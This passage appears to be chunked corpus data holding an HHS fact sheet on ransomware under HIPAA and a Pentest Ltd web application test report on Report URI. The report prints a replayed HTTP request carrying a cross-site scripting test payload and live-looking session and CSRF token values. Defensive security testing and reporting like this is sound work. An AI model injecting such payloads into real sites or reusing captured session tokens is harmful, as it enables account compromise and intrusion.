Government Interagency Guidance Document, How to Protect Your Networks from Ransomware available at https://www.justice.gov/criminal-ccips/file/872771/download. 2 Exfiltration is “[t]he unauthorized transfer of information from an information system.” NIST SP 800-53 Rev. 4, Security and Privacy Controls for Federal Information Systems and Organizations. (April 2013). Available at http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf.\\n• training users on malicious software protection so they can assist in detecting malicious software and know how to report such detections; and • implementing access controls to limit access to ePHI to only those persons or software programs requiring access. The Security Management Process standard of the Security Rule includes requirements for all covered entities and business associates to conduct an accurate and thorough risk analysis of the potential risks and vulnerabilities to the confidentiality, integrity, and availability of all of the ePHI the entities create, receive, maintain, or transmit and to implement security measures sufficient to reduce those identified risks and vulnerabilities to a reasonable",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 0
    }
  },
  {
    "text": "business associates to conduct an accurate and thorough risk analysis of the potential risks and vulnerabilities to the confidentiality, integrity, and availability of all of the ePHI the entities create, receive, maintain, or transmit and to implement security measures sufficient to reduce those identified risks and vulnerabilities to a reasonable and appropriate level. It is expected that covered entities and business associates will use this process of risk analysis and risk management not only to satisfy the specific standards and implementation specifications of the Security Rule, but also when implementing security measures to reduce the particular risks and vulnerabilities to ePHI throughout an organization’s entire enterprise, identified as a result of an accurate and thorough risk analysis, to a reasonable and appropriate level. For example, although there is a not a Security Rule standard or implementation specification that specifically and expressly requires entities to update the firmware3 of network devices, entities, as part of their risk analysis and risk management process, should, as appropriate, identify and address the risks to ePHI of using networks devices running on obsolete firmware, especially when firmware updates are available to remediate known security vulnerabilities. In general, moreover, the Security Rule simply establishes a floor, or minimum requirements, for the security of ePHI; entities are permitted (and encouraged) to implement additional and/or more stringent security measures above what they determine to be required by Security Rule standards. 3. Can HIPAA compliance help covered entities and business associates recover from infections of malware, including ransomware? Yes. The HIPAA Security Rule requires covered entities and business associates to implement policies and procedures that can assist an entity in responding to and recovering from a ransomware attack. Because ransomware denies access to data, maintaining frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack. Test restorations should be periodically conducted to verify the integrity of backed up data and provide confidence in an organization’s data restoration capabilities. Because some ransomware variants have been known to remove or otherwise disrupt online backups, entities should consider maintaining backups offline and unavailable from their networks. 3 Firmware refers to “[c]omputer programs and data stored in hardware... such that the programs and data cannot be dynamically written or modified during execution of the programs.” NIST SP 800-53 Rev. 4, Security and Privacy Controls for Federal Information Systems and Organizations. (April 2013). Available at http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf. 2\\nImplementing a data backup plan is a Security Rule requirement for HIPAA covered entities and business associates as part of maintaining an overall contingency plan. Additional activities that must be included as part of an entity’s contingency plan include: disaster recovery planning, emergency operations planning, analyzing the criticality of applications and data to ensure all necessary applications and data are accounted for, and periodic testing of contingency plans to ensure organizational readiness to execute such plans and provide confidence they will be effective. See 45 C.F.R. 164.308(a)(7). During the course of responding to a ransomware attack, an entity may",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 1
    }
  },
  {
    "text": "applications and data to ensure all necessary applications and data are accounted for, and periodic testing of contingency plans to ensure organizational readiness to execute such plans and provide confidence they will be effective. See 45 C.F.R. 164.308(a)(7). During the course of responding to a ransomware attack, an entity may find it necessary to activate its contingency or business continuity plans. Once activated, an entity will be able to continue its business operations while continuing to respond to and recover from a ransomware attack. Maintaining confidence in contingency plans and data recovery is critical for effective incident response, whether the incident is a ransomware attack or fire or natural disaster. Security incident procedures, including procedures for responding to and reporting security incidents, are also required by HIPAA. See 45 C.F.R. 164.308(a)(6). An entity’s security incident procedures should prepare it to respond to various types of security incidents, including ransomware attacks. Robust security incident procedures for responding to a ransomware attack should include processes to4: • detect and conduct an initial analysis of the ransomware; • contain the impact and propagation of the ransomware; • eradicate the instances of ransomware and mitigate or remediate vulnerabilities that permitted the ransomware attack and propagation; • recover from the ransomware attack by restoring data lost during the attack and returning to “business as usual” operations; and • conduct post-incident activities, which could include a deeper analysis of the evidence to determine if the entity has any regulatory, contractual or other obligations as a result of the incident (such as providing notification of a breach of protected health information), and incorporating any lessons learned into the overall security management process of the entity to improve incident response effectiveness for future security incidents. 4. How can covered entities or business associates detect if their computer systems are infected with ransomware? Unless ransomware is detected and propagation halted by an entity’s malicious software protection or other security measures, an entity would typically be alerted to the presence of ransomware only after the ransomware has encrypted the user’s data and alerted the user to its presence to demand payment. However, in some cases, an entity’s workforce may notice early indications of a ransomware attack that has evaded the entity’s security measures. HIPAA’s requirement that an entity’s workforce receive appropriate security training, including training for detecting and reporting instances of malicious 4 Adapted from NIST SP 800-61Rev. 2, Computer Security Incident Handling Guide. 3\\nsoftware, can thus assist entities in preparing their staff to detect and respond to ransomware. Indicators of a ransomware attack could include: • a user’s realization that a link that was clicked on, a file attachment opened, or a website visited may have been malicious in nature; • an increase in activity in the central processing unit (CPU) of a computer and disk activity for no apparent reason (due to the ransomware searching for, encrypting and removing data files); • an inability to access certain files as the ransomware encrypts, deletes and re-names and/or re- locates",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 2
    }
  },
  {
    "text": "nature; • an increase in activity in the central processing unit (CPU) of a computer and disk activity for no apparent reason (due to the ransomware searching for, encrypting and removing data files); • an inability to access certain files as the ransomware encrypts, deletes and re-names and/or re- locates data; and • detection of suspicious network communications between the ransomware and the attackers’ command and control server(s) (this would most likely be detected by IT personnel via an intrusion detection or similar solution). If an entity believes that a ransomware attack is underway, either because of indicators similar to those above or other methods of detection, the entity should immediately activate its security incident response plan, which should include measures to isolate the infected computer systems in order to halt propagation of the attack. Additionally, it is recommended that an entity infected with ransomware contact its local FBI or United States Secret Service field office. These agencies work with Federal, state, local and international partners to pursue cyber criminals globally and assist victims of cybercrime. 5. What should covered entities or business associates do if their computer systems are infected with ransomware? The presence of ransomware (or any malware) on a covered entity’s or business associate’s computer systems is a security incident under the HIPAA Security Rule. A security incident is defined as the attempted or successful unauthorized access, use, disclosure, modification, or destruction of information or interference with system operations in an information system. See the definition of security incident at 45 C.F.R. 164.304. Once the ransomware is detected, the covered entity or business associate must initiate its security incident and response and reporting procedures. See 45 C.F.R. 164.308(a)(6). HIPAA covered entities and business associates are required to develop and implement security incident procedures and response and reporting processes that they believe are reasonable and appropriate to respond to malware and other security incidents, including ransomware attacks. Entities seeking guidance regarding the implementation of security incident procedures may wish to review NIST SP 800- 61 Rev. 2, Computer Security Incident Handling Guide5 for additional information. An entity’s security incident response activities should begin with an initial analysis to: 5 Available at http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf 4\\n• determine the scope of the incident to identify what networks, systems, or applications are affected; • determine the origination of the incident (who/what/where/when); • determine whether the incident is finished, is ongoing or has propagated additional incidents throughout the environment; and • determine how the incident occurred (e.g., tools and attack methods used, vulnerabilities exploited). These initial steps should assist the entity in prioritizing subsequent incident response activities and serve as a foundation for conducting a deeper analysis of the incident and its impact. Subsequent security incident response activities should include steps to: • contain the impact and propagation of the ransomware; • eradicate the instances of ransomware and mitigate or remediate vulnerabilities that permitted the ransomware attack and propagation; • recover from the ransomware attack by restoring data lost during the attack and returning",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 3
    }
  },
  {
    "text": "security incident response activities should include steps to: • contain the impact and propagation of the ransomware; • eradicate the instances of ransomware and mitigate or remediate vulnerabilities that permitted the ransomware attack and propagation; • recover from the ransomware attack by restoring data lost during the attack and returning to “business as usual” operations; and • conduct post-incident activities, which could include a deeper analysis of the evidence to determine if the entity has any regulatory, contractual or other obligations as a result of the incident (such as providing notification of a breach of protected health information), and incorporating any lessons learned into the overall security management process of the entity to improve incident response effectiveness for future security incidents. Part of a deeper analysis should involve assessing whether or not there was a breach of PHI as a result of the security incident. The presence of ransomware (or any malware) is a security incident under HIPAA that may also result in an impermissible disclosure of PHI in violation of the Privacy Rule and a breach, depending on the facts and circumstances of the attack. See the definition of disclosure at 45 C.F.R. 160.103 and the definition of breach at 45 C.F.R. 164.402. 6. Is it a HIPAA breach if ransomware infects a covered entity’s or business associate’s computer system? Whether or not the presence of ransomware would be a breach under the HIPAA Rules is a fact-specific determination. A breach under the HIPAA Rules is defined as, “...the acquisition, access, use, or disclosure of PHI in a manner not permitted under the [HIPAA Privacy Rule] which compromises the security or privacy of the PHI.” See 45 C.F.R. 164.402.6 When electronic protected health information (ePHI) is encrypted as the result of a ransomware attack, a breach has occurred because the ePHI encrypted by the ransomware was acquired (i.e., unauthorized 6 See also Section 13402 of the Health Information Technology for Economic and Clinical Health (HITECH) Act. 5\\nindividuals have taken possession or control of the information), and thus is a “disclosure” not permitted under the HIPAA Privacy Rule. Unless the covered entity or business associate can demonstrate that there is a “...low probability that the PHI has been compromised,” based on the factors set forth in the Breach Notification Rule, a breach of PHI is presumed to have occurred. The entity must then comply with the applicable breach notification provisions, including notification to affected individuals without unreasonable delay, to the Secretary of HHS, and to the media (for breaches affecting over 500 individuals) in accordance with HIPAA breach notification requirements. See 45 C.F.R. 164.400-414. 7. How can covered entities or business associates demonstrate “...that there is a low probability that the PHI has been compromised” such that breach notification would not be required? To demonstrate that there is a low probability that the protected health information (PHI) has been compromised because of a breach, a risk assessment considering at least the following four factors (see 45 C.F.R. 164.402(2)) must be",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 4
    }
  },
  {
    "text": "the PHI has been compromised” such that breach notification would not be required? To demonstrate that there is a low probability that the protected health information (PHI) has been compromised because of a breach, a risk assessment considering at least the following four factors (see 45 C.F.R. 164.402(2)) must be conducted: 1. the nature and extent of the PHI involved, including the types of identifiers and the likelihood of re-identification; 2. the unauthorized person who used the PHI or to whom the disclosure was made; 3. whether the PHI was actually acquired or viewed; and 4. the extent to which the risk to the PHI has been mitigated. A thorough and accurate evaluation of the evidence acquired and analyzed as a result of security incident response activities could help entities with the risk assessment process above by revealing, for example: the exact type and variant of malware discovered; the algorithmic steps undertaken by the malware; communications, including exfiltration attempts between the malware and attackers’ command and control servers; and whether or not the malware propagated to other systems, potentially affecting additional sources of electronic PHI (ePHI). Correctly identifying the malware involved can assist an entity to determine what algorithmic steps the malware is programmed to perform. Understanding what a particular strain of malware is programmed to do can help determine how or if a particular malware variant may laterally propagate throughout an entity’s enterprise, what types of data the malware is searching for, whether or not the malware may attempt to exfiltrate data, or whether or not the malware deposits hidden malicious software or exploits vulnerabilities to provide future unauthorized access, among other factors. Although entities are required to consider the four factors listed above in conducting their risk assessments to determine whether there is a low probability of compromise of the ePHI, entities are encouraged to consider additional factors, as needed, to appropriately evaluate the risk that the PHI has been compromised. If, for example, there is high risk of unavailability of the data, or high risk to the 6\\nintegrity of the data, such additional factors may indicate compromise. In those cases, entities must provide notification to individuals without unreasonable delay, particularly given that any delay may impact healthcare service and patient safety. Additionally, with respect to considering the extent to which the risk to PHI has been mitigated (the fourth factor) where ransomware has accessed PHI, the entity may wish to consider the impact of the ransomware on the integrity of the PHI. Frequently, ransomware, after encrypting the data it was seeking, deletes the original data and leaves only the data in encrypted form. An entity may be able to show mitigation of the impact of a ransomware attack affecting the integrity of PHI through the implementation of robust contingency plans including disaster recovery and data backup plans. Conducting frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack and ensuring the integrity of PHI affected by ransomware. Test",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 5
    }
  },
  {
    "text": "attack affecting the integrity of PHI through the implementation of robust contingency plans including disaster recovery and data backup plans. Conducting frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack and ensuring the integrity of PHI affected by ransomware. Test restorations should be periodically conducted to verify the integrity of backed up data and provide confidence in an organization’s data restoration capabilities. Integrity to PHI data is only one aspect when considering to what extent the risk to PHI has been mitigated. Additional aspects, including whether or not PHI has been exfiltrated, should also be considered when determining the extent to which the risk to PHI has been mitigated. The risk assessment to determine whether there is a low probability of compromise of the PHI must be thorough, completed in good faith and reach conclusions that are reasonable given the circumstances. Furthermore, in accordance with 45 C.F.R. 164.530(j)(iv)), covered entities and business associates must maintain supporting documentation sufficient to meet their burden of proof (see 45 C.F.R. 164.414) regarding the breach assessment – and if applicable, notification - process including: • documentation of the risk assessment demonstrating the conclusions reached; • documentation of any exceptions determined to be applicable to the impermissible use or disclosure (see 45 C.F.R. 164.402(1)) of the PHI; and • documentation demonstrating that all notifications were made, if a determination was made that the impermissible use or disclosure was a reportable breach. 8. Is it a reportable breach if the ePHI encrypted by the ransomware was already encrypted to comply with HIPAA? This is a fact specific determination. The HIPAA breach notification provisions apply to “unsecured PHI” (see 45 C.F.R. 164.402), which is protected health information (PHI) that is not secured through the use of a technology or methodology specified by the Secretary in guidance. If the electronic PHI (ePHI) is encrypted by the entity in a manner consistent with the Guidance to Render Unsecured Protected Health Information Unusable, Unreadable, or Indecipherable to Unauthorized Individuals7 such that it is no longer “unsecured PHI,” then the entity is not required to conduct a risk assessment to determine if there is a low probability of compromise, and breach notification is not required. 7 Available at http://www.hhs.gov/hipaa/for-professionals/breach-notification/guidance/index.html 7\\nHowever, even if the PHI is encrypted in accordance with the HHS guidance, additional analysis may still be required to ensure that the encryption solution, as implemented, has rendered the affected PHI unreadable, unusable and indecipherable to unauthorized persons. A full disk encryption solution may render the data on a computer system’s hard drive unreadable, unusable and indecipherable to unauthorized persons while the computer system (such as a laptop) is powered down. Once the computer system is powered on and the operating system is loaded, however, many full disk encryption solutions will transparently decrypt and encrypt files accessed by the user. For example, if a laptop encrypted with a full disk encryption solution in a manner consistent with HHS guidance8 is properly",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 6
    }
  },
  {
    "text": "Once the computer system is powered on and the operating system is loaded, however, many full disk encryption solutions will transparently decrypt and encrypt files accessed by the user. For example, if a laptop encrypted with a full disk encryption solution in a manner consistent with HHS guidance8 is properly shut down and powered off and then lost or stolen, the data on the laptop would be unreadable, unusable and indecipherable to anyone other than the authenticated user. Because the PHI on the laptop is not “unsecured PHI”, a covered entity or business associate need not perform a risk assessment to determine a low probability of compromise or provide breach notification. However, in contrast to the above example, if the laptop is powered on and in use by an authenticated user, who then performs an action (clicks on a link to a malicious website, opens an attachment from a phishing email, etc.) that infects the laptop with ransomware, there could be a breach of PHI. If full disk encryption is the only encryption solution in use to protect the PHI and if the ransomware accesses the file containing the PHI, the file containing the PHI will be transparently decrypted by the full disk encryption solution and access permitted with the same access levels granted to the user. Because the file containing the PHI was decrypted and thus “unsecured PHI” at the point in time that the ransomware accessed the file, an impermissible disclosure of PHI was made and a breach is presumed. Under the HIPAA Breach Notification Rule, notification in accordance with 45 CFR 164.404 is required unless the entity can demonstrate a low probability of compromise of the PHI based on the four factor risk assessment (see 45 C.F.R. 164.402(2)). 8 HHS guidance to render unsecured PHI unusable, unreadable or indecipherable to unauthorized individuals indicates that encryption solutions for data-at-rest must be consistent with NISP SP 800-111, Guide to Storage Encryption Technologies for End User Devices, in order for encrypted PHI to not be “unsecured PHI”. It must be noted, however, that consistency with NIST SP 800-111 requires not only the consideration of an encryption algorithm, but also consideration of additional areas of an encryption solution including encryption methodologies (e.g., full disk, virtual disk/volume, folder/file), cryptographic key management, and pre-boot authentication, where applicable. 8",
    "metadata": {
      "doc_id": "RansomwareFactSheet",
      "chunk_id": 7
    }
  },
  {
    "text": "Penetration Testing Report 3756 Web Application Test 27/11/2024 A uthor: Jose Barrera 22 Great James Street, London, WC1N 3ES Tel: +44 (0)161 233 0100 Web: www.pentest.co.uk COPYRIGHT PENTEST LIMITED 2024 ALL RIGHTS RESERVED. NO PART OF THIS PUBLICATION MAY BE REPRODUCED, STORED IN A RETRIEVAL SYSTEM, OR TRANSMITTED IN ANY FORM, OR BY ANY MEANS, ELECTRONIC, MECHANICAL, PHOTOCOPYING, RECORDING OR OTHERWISE, WITHOUT THE PRIOR WRITTEN PERMISSION OF THE COPYRIGHT HOLDER.\\nConfidential 2 3756 - App Test <CustomerNameLong> Table of Contents 1 Document Revision History.................................................................................................... 3 2 Introduction ............................................................................................................................ 4 3 Executive Summary ............................................................................................................... 5 4 Recommended Actions .......................................................................................................... 8 5 Technical Findings ................................................................................................................. 9 5.1 Vulnerabilities in Outdated Dependencies Detected .......................................................... 9 5.2 No Anti-Automation Protection .......................................................................................... 11 6 Additional Information .......................................................................................................... 13 Confidential 2 3756 – Web App Test\\nConfidential 3 3756 - App Test <CustomerNameLong> 1 Document Revision History Name Date Version Comment Jose Barrera 21/11/2024 0.1 Initial Document Paul Johnston 21/11/2024 0.2 QA by Senior Consultant Jose Barrera 22/11/2024 1.0 Final Draft Jose Barrera 27/11/2024 2.0 Final Draft v2 Confidential 3 3756 – Web App Test\\nConfidential 4 3756 - App Test <CustomerNameLong> 2 Introduction Report URI was founded to take the pain out of monitoring security policies like CSP and other modern security features. Report URI are the best real-time monitoring platform for cutting edge web standards. Their experience, focus, and exposure allow them to take the hassle out of collecting, processing, and understanding reports, giving customers just the information they need. Report URI have indicated the need for a repeat security test of their ‘Report URI’ application in order to identify vulnerabilities to attacks that could be launched across a computer network, and to provide security assurances regarding their systems. Such a test will allow Report URI to undertake remediation efforts and increase their overall security posture. 2.1 Scope & Duration This assessment included the following phase of work: • Phase 1 – Web application assessment of Report URI application The duration included 5 days effort (including reporting). Work commenced on 11/11/2024 and concluded on 19/11/2024. 2.2 Scenarios Included • Black-Box assessment – testing the web application while unauthenticated without additional information. This simulates a real-world threat posed to all Internet facing services. • Rogue-User Scenario – using credentials provided to simulate the risk as various levels of user account. This simulates the risk of a user either by choice or by being compromised attacking the system. • White-box assessment – using the source code provided. All the tests were performed against the production environment. 2.3 Target(s) • https://report-uri.com Confidential 4 3756 – Web App Test\\nConfidential 5 3756 - App Test <CustomerNameLong> 3 Executive Summary Overall, the Report URI application performed well during the assessment. It demonstrated a strong performance throughout the engagement, effectively thwarting attempts by authenticated attackers to exploit vulnerabilities like SQL Injection and Cross-Site Scripting that could potentially compromise the server or application. The application also had proper user access controls in place and showed no signs of an attack surface for authorisation-based attacks. Only",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 0
    }
  },
  {
    "text": "strong performance throughout the engagement, effectively thwarting attempts by authenticated attackers to exploit vulnerabilities like SQL Injection and Cross-Site Scripting that could potentially compromise the server or application. The application also had proper user access controls in place and showed no signs of an attack surface for authorisation-based attacks. Only low-severity issues were identified that should be resolved to add additional layers of security to the application and further harden it. Full details of each issue as well as recommended remedial actions can be found documented in the Technical Findings section. 3.1 Next Steps A complete writeup of every issue is available in the body of this report. It includes required steps to confirm and replicate each issue, along with recommended remedial actions. Pentest recommend taking time to review the findings before arranging a triage meeting to determine the order of priority for remedial work. As a rule of thumb: • Low and Info Risk Items – Track these within a risk register and discuss remediation versus acceptance. If recommendations within this report are followed Pentest believe that the target’s security posture will improve. 3.2 Caveats Pentest provides no warranty that the target(s) are now free from other defects. Security is an ever- evolving field and consultancy is based on the opinions of the consultant, their understanding of the goals of Report URI as well as their individual experience. The findings of this project are based on a time-limited assessment and by necessity can only focus on approved targets which are in scope. An attacker would not be constrained by either time or scope limits and could circumvent controls which are impractical to assess via structured penetration testing. To appropriately secure assets Pentest encourage a cyclical approach to assessment. Each cycle should include: • Comprehensive Assessment – where a full list of findings is produced with the widest scope possible. • Focused Verification Testing – where solutions to the initial assessment’s findings are verified. Depending on how important the target is to the concerns of Report URI, Pentest recommend repeating the cycle every 6-months or 12-months at least. Confidential 5 3756 – Web App Test\\nConfidential 6 3756 - App Test <CustomerNameLong> 3.3 Risk Categories & Rationales Pentest use a simple risk categorisation of each vulnerability to focus the triage process at the risks which truly matter. The Common Vulnerability Scoring System (CVSS) is an industry standard formula. It generates a risk score between 0.0 and 10.0. The table below explains the risk categories and demonstrates rule-of-thumb equivalency with CVSS scores: Risk Category CVSS Score Rationales 8.1 – 10.0 Poses a severe risk which is easy to exploit. Begin the process of remediating immediately after the issue has been presented. 6.1 – 8.0 Poses a significant risk and can be exploited. Address these as soon as possible after any critical risks have been remediated. 4.1 – 6.0 Poses an important risk but may be difficult to exploit. Pentest recommends remedial work within 3 months of discovery. 2.1 – 4.0 Poses a",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 1
    }
  },
  {
    "text": "– 8.0 Poses a significant risk and can be exploited. Address these as soon as possible after any critical risks have been remediated. 4.1 – 6.0 Poses an important risk but may be difficult to exploit. Pentest recommends remedial work within 3 months of discovery. 2.1 – 4.0 Poses a minor risk or may be exceedingly difficult to exploit. Address these over the long-term during testing cycles. 0.0 – 2.0 Loss of sensitive information, or a discussion point. These are not directly exploitable but may aid an attacker. Remediate these to create a true defence-in-depth security posture. CVSS is not applicable to all risks. For example, it is incapable of capturing the risk of a “flat network design”. Experience has told us that this is a “high” risk in most cases. For this reason, the reader may find vulnerabilities which have no CVSS rating in our reports. We endeavour to provide the reason for omitting the risk score when that is the case, and to provide CVSS by default in all applicable cases. Confidential 6 3756 – Web App Test\\nConfidential 7 3756 - App Test <CustomerNameLong> 3.4 Visual Summary 3 2 Info Low Medium High 1 Critical 0 Info Low Medium High Critical Count 0 2 0 0 0 Confidential 7 3756 – Web App Test\\nConfidential 8 3756 - App Test <CustomerNameLong> 4 Recommended Actions ID Vuln Title Recommended Action Pentest Risk Category CVSS 1 Vulnerabilities in Outdated Upgrade the affected libraries to the latest 3.1/Low Dependencies Detected supported version. 2 No Anti-Automation Protection Consider fine tuning CloudFlare Bot protections on 3.1/Low vulnerable functions. Confidential 8\\n5 Technical Findings 5.1 Vulnerabilities in Outdated Dependencies Detected 5.1.1 Background Most software products are developed using APIs or libraries provided by third parties. Doing so reduces development time and cost and feeds into the “why re-invent the wheel?” philosophy. Once a component has been integrated into an application it must be upgraded regularly to guard against bugs and remove publicly known vulnerabilities. Failure to do so can mean that the application itself is at risk of exploitation due to weaknesses that exist in the supporting dependencies. This risk has been captured by the OWASP top 10 2021 project as category A06 labelled “Vulnerable and Outdated Components” defined at reference [1]. 5.1.2 Details During the assessment a few supporting JavaScript libraries were identified which contained publicly disclosed vulnerabilities such as Cross-Site Scripting. The table below identifies the location within the application and the related CVE associated with directly related vulnerabilities. Component version Location implemented Vulnerability CVE Bootstrap 3.4.1 https://cdn.report- Cross-Site Scripting CVE-2024-6484 uri.com/libs/twitter- bootstrap/3.4.1/js/bootstra p.min.js Select 4.2 https://cdn.report- Cross-Site Scripting CVE-2016-10744 uri.com/libs/select2/3.5.2/ select2.min.js Additionally, Bootstrap version 3.4.1 currently reached EOL (end of life) and no longer receive any updates from the vendor, which exacerbates this issue. More information about Bootstrap’s version 3 reaching EOL is available in reference [4]. Confidential 9\\n5.1.3 Risk Analysis Pentest Risk Category CVSS 3.1/Low AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:L Explanation The risk associated with this issue was considered low, as no areas of the application",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 2
    }
  },
  {
    "text": "longer receive any updates from the vendor, which exacerbates this issue. More information about Bootstrap’s version 3 reaching EOL is available in reference [4]. Confidential 9\\n5.1.3 Risk Analysis Pentest Risk Category CVSS 3.1/Low AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:L Explanation The risk associated with this issue was considered low, as no areas of the application were found to reflect user inputs without appropriate HTML encoding. Moreover, the application implemented a strict CSP. The issue is raised to encourage updating the affected libraries and is not believed to constitute an immediate threat to Report URI or its users. 5.1.4 Recommendation The immediate recommendation is to download and integrate the latest supported versions of each outdated dependency. Pentest understands that this would be a significant undertaking for radius, due to changes in the underlying APIs and updated versions of the dependencies. As such, to ensure that updated components do not affect the user experience, a full User Acceptance Testing (UAT) would need to be carried out. The advice above would triage the initial problem only and would not prevent the situation from recurring. The long-term solution is to modify the Software Development Life Cycle (SDLC) to ensure that dependencies are regularly updated. OWASP provides a free tool called “dependency-check” (see reference [2]) which can be integrated into most build processes. 5.1.5 References [1] OWASP Top 10: A06_2021 - Vulnerable and Outdated Components [2] OWASP: OWASP Dependency Check [3] TaringAmberini: Ready to use Java Dependencies Vulnerability Checker [4] GitHub – Bootstrap version 4 issue 5.1.6 Affected Item(s) • https://report-uri.com Confidential 10\\n5.2 No Anti-Automation Protection 5.2.1 Background Web applications are subjected to unwanted automated usage. Usually, these events occur due to an improper usage of an existing functionality rather than the exploitation of vulnerabilities. Also, excessive misuse is commonly mistakenly reported as application Denial-of-Service (DoS) like HTTP-flooding, when in fact the DoS is a side-effect instead of the primary intent. Insufficient anti-automation occurs when a web application permits an attacker to automate a process that was originally designed to be performed only in a manual fashion, i.e. by a human web user 5.2.2 Details The application did implement anti-automation measures to protect against excessive automated requests. However, as the CloudFlare Bot Management was disabled for the test, remote attackers were able to send many requests to access or generate data. Although the application used CSRF tokens and validated them properly, it was possible to reuse the CSRF token because a non-standard client (Burp Suite) was used during testing. This client enabled manual manipulation and replay of HTTP requests, bypassing the typical flow of the application and allowing automation. Below is one request issued by the application to create a team: POST /team/create_team/ HTTP/2 Host: report-uri.com Cookie: _nss=1; __cf_bm=lYfP1QOpjdweC0p5pHFLAAvVIv1d91kYWSuu5nMGg5M-1731935807-1.0.1.1- ne_YxFLihgBqNOL5ndq8LwzKFHp5eFI7JSLlzYTJQtjdfQT8KX1YfX8kyMGMlnqzAE8eAKd90S.lm2x0AJ0KlA; __Host-report_uri_csrf=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83; __Host- report_uri_sess=c3k0adha2690t2qlqnspbbtr30 [...] Referer: https://report-uri.com/account/teams/ csrf_token=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83&name=Test%22%3E%3Cscript%3Ealert%281%29%3C%2Fsc ript The following image shows the teams that were created by the consultant: Figure 1 – CSRF token reuse Confidential 11\\n5.2.3 Risk Analysis Pentest Risk Category CVSS 3.1/Low AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L Explanation The risk rating has been set to \"Low\" since testing was conducted with",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 3
    }
  },
  {
    "text": "__Host-report_uri_csrf=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83; __Host- report_uri_sess=c3k0adha2690t2qlqnspbbtr30 [...] Referer: https://report-uri.com/account/teams/ csrf_token=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83&name=Test%22%3E%3Cscript%3Ealert%281%29%3C%2Fsc ript The following image shows the teams that were created by the consultant: Figure 1 – CSRF token reuse Confidential 11\\n5.2.3 Risk Analysis Pentest Risk Category CVSS 3.1/Low AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L Explanation The risk rating has been set to \"Low\" since testing was conducted with Cloudflare Bot Management disabled. However, it is unlikely that Cloudflare Bot Management would have prevented this brute-force attempt under normal conditions, as only 6 requests were issued within a short time frame. The limited request volume would likely not trigger typical rate-limiting or anomaly detection mechanisms, making this vulnerability feasible for exploitation in scenarios with similar traffic patterns. 5.2.4 Recommendation Pentest recommends implementing anti-automation controls on the affected forms. By significantly delaying the success of a password-guessing attack, it provides an effective deterrent to attackers. Consider the following options to reduce the effectiveness of automated bot attacks: • CAPTCHA can help prevent automated bots by requiring manual interactions from a human. For example, Google’s ReCAPTCHA asks the user to identify an object (such as a car or traffic light) from a photo. • Rate-Limiting Requests simply reduces the number of requests an attacker can be made within reasonable time period to the server. 5.2.5 References [1] OWASP: Automated Threats to Web Applications 5.2.6 Affected Item(s) • https://report-uri.com Confidential 12\\n6 6 Additional Information 6.1 WHOIS Database The WHOIS database stores information about the individual or organisation who owns and manages a domain or IP address range. Attackers will review WHOIS entries trying to find useful information such as names and contact details for employees. Best practices state that generic contact details should be used such as “whois@domain.com” rather than providing the name of a member of staff. 6.1.1 Entry for Domain: report-uri.com Domain Name: REPORT-URI.COM Registry Domain ID: 1651365076_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.namecheap.com Registrar URL: http://www.namecheap.com Updated Date: 2024-03-18T08:02:32Z Creation Date: 2011-04-17T11:55:31Z Registry Expiry Date: 2025-04-17T11:55:31Z Registrar: NameCheap, Inc. Registrar IANA ID: 1068 Registrar Abuse Contact Email: abuse@namecheap.com Registrar Abuse Contact Phone: +1.6613102107 Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Name Server: CARL.NS.CLOUDFLARE.COM Name Server: COCO.NS.CLOUDFLARE.COM DNSSEC: signedDelegation DNSSEC DS Data: 2371 13 2 B86DC8BE786CAFA5B1D92F52AA23CD9B62AF70DBE9D907AC61A1F9469513B5F6 URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/ >>> Last update of whois database: 2024-11-21T10:13:42Z <<< 6.1.2 Entry for IP Address Range: 104.16.0.0 - 104.31.255.255 NetRange: 104.16.0.0 - 104.31.255.255 CIDR: 104.16.0.0/12 NetName: CLOUDFLARENET NetHandle: NET-104-16-0-0-1 Parent: NET104 (NET-104-0-0-0-0) NetType: Direct Allocation OriginAS: AS13335 Organization: Cloudflare, Inc. (CLOUD14) RegDate: 2014-03-28 Updated: 2024-09-04 Comment: All Cloudflare abuse reporting can be done via https://www.cloudflare.com/abuse Comment: Geofeed: https://api.cloudflare.com/local-ip-ranges.csv Ref: https://rdap.arin.net/registry/ip/104.16.0.0 OrgName: Cloudflare, Inc. OrgId: CLOUD14 Address: 101 Townsend Street City: San Francisco StateProv: CA PostalCode: 94107 Country: US RegDate: 2010-07-09 Updated: 2021-07-01 Ref: https://rdap.arin.net/registry/entity/CLOUD14 OrgRoutingHandle: CLOUD146-ARIN OrgRoutingName: Cloudflare-NOC OrgRoutingPhone: +1-650-319-8930 Confidential 13\\nOrgRoutingEmail: noc@cloudflare.com OrgRoutingRef: 